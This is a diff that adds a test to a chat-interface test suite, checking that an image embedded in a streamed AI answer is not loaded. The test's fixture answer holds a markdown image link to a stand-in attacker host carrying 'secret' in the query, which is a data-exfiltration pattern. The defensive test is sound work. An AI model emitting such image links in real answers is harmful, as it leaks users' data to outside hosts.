@@ -206,4 +206,14 @@ describe("ChatThread", () => {
     expect(await screen.findByText("再起動後の答え")).toBeInTheDocument();
     expect(calls).toHaveLength(2);
   });
+
+  it("does not load images written in an answer", async () => {
+    setupIpc({});
+    mockFetch(() => streamResponse(answerChunks("結果 ![図](https://evil.example.com/?q=secret) です")));
+    renderThread();
+    await ask("質問");
+    expect(await screen.findByText(/結果/)).toBeInTheDocument();
+    expect(document.querySelector(".chat-markdown img")).toBeNull();
+    expect(screen.getByText("図")).toBeInTheDocument();
+  });
 });
